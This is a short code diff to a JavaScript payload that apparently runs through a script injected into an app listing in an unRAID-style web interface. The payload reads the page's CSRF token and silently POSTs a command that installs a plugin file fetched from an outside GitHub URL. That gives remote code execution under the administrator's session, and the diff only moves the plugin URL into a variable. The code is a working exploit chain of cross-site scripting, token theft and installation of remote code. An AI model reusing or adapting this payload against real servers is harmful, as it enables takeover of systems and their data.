@@ -1,3 +1,6 @@
+var pluginURL = 'https://raw.githubusercontent.com/justin-himself/test/refs/heads/main/unRAIDCore.plg';
+var encodedPluginURL = encodeURIComponent(pluginURL);
+
 // Select the div with a specific 'data-appname' value that contains JavaScript code
 var div = document.querySelector('[data-appname="<script>fetch("]');
 
@@ -23,7 +26,7 @@ fetch('/Plugins')
           'X-Requested-With': 'XMLHttpRequest'
         },
         // Send the CSRF token and the command to install the plugin as part of the POST body
-        body: `cmd=plugin+install+https%3A%2F%2Fraw%2Egithubusercontent%2Ecom%2Fjustin%2Dhimself%2Ftest%2Frefs%2Fheads%2Fmain%2FunRAIDCore%2Eplg+nchan&start=0&csrf_token=${csrfToken}`,
+        body: `cmd=plugin+install+${encodedPluginURL}+nchan&start=0&csrf_token=${csrfToken}`,
         credentials: 'same-origin'  // Ensures that any cookies related to the page are sent along with the request
       });
     } else {
